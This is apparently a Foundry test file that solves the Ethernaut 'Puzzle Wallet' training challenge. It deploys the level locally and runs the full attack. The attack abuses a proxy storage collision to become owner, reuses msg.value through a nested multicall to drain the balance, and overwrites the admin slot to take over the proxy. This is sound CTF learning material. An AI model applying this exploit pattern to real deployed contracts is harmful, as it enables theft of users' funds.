pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "../PuzzleWallet/PuzzleWalletFactory.sol";
import "./utils/vm.sol";

contract PuzzleWalletTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    address eoaAddress = address(100);

    // Memory cannot hold dynamic byte arrays must be storage
    bytes[] depositData = [abi.encodeWithSignature("deposit()")];
    bytes[] multicallData =
        [abi.encodeWithSignature("deposit()"), abi.encodeWithSignature("multicall(bytes[])", depositData)];

    event IsTrue(bool answer);

    function setUp() public {
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testPuzzleWalletHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
        (address levelAddressProxy, address levelAddressWallet) = puzzleWalletFactory.createInstance{value: 1 ether}();
        PuzzleProxy ethernautPuzzleProxy = PuzzleProxy(payable(levelAddressProxy));
        PuzzleWallet ethernautPuzzleWallet = PuzzleWallet(payable(levelAddressWallet));

        vm.startPrank(eoaAddress);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(ethernautPuzzleWallet.deposit.selector);

        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = depositSelector[0];
        nestedMulticall[1] = abi.encodeWithSelector(ethernautPuzzleWallet.multicall.selector, depositSelector);

        ethernautPuzzleProxy.proposeNewAdmin(eoaAddress);

        ethernautPuzzleWallet.addToWhitelist(eoaAddress);

        ethernautPuzzleWallet.multicall{value: 1 ether}(nestedMulticall);

        ethernautPuzzleWallet.execute(eoaAddress, 2 ether, "");

        console.log(address(ethernautPuzzleWallet).balance);

        ethernautPuzzleWallet.setMaxBalance(uint256(uint160(eoaAddress)));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        // Verify We have become admin
        assertTrue((ethernautPuzzleProxy.admin() == eoaAddress));
        vm.stopPrank();
    }
}
